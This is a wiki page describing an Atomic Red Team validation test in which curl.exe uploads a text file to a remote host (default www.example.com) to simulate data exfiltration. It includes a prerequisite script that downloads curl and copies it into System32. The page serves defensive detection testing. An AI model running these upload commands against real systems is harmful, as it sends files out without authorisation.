---
atomic_guid: "635c9a38-6cbf-47dc-8615-3810bc1167cf"
title: "Curl Upload File"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "635c9a38-6cbf-47dc-8615-3810bc1167cf"
  - "Curl Upload File"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Curl Upload File

The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration
Expected output will include whether the file uploaded successfully or not.

## Metadata

- Atomic GUID: 635c9a38-6cbf-47dc-8615-3810bc1167cf
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### curl_path

- description: path to curl.exe
- type: path
- default: C:\Windows\System32\Curl.exe

### file_path

- description: File to upload
- type: string
- default: c:\temp\atomictestfile.txt

### remote_destination

- description: Remote destination
- type: string
- default: www.example.com

## Dependencies

Curl must be installed on system.

### Prerequisite Check

```text
if (Test-Path #{curl_path}) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile PathToAtomicsFolder\..\ExternalPayloads\curl.zip
Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
```

A file must be created to upload

### Prerequisite Check

```text
if (Test-Path #{file_path}) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
echo "This is an Atomic Test File" > #{file_path}
```

## Executor

- name: command_prompt

### Command

```commandprompt
#{curl_path} -T #{file_path} #{remote_destination}
#{curl_path} --upload-file #{file_path} #{remote_destination}
#{curl_path} -d #{file_path} #{remote_destination}
#{curl_path} --data #{file_path} #{remote_destination}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
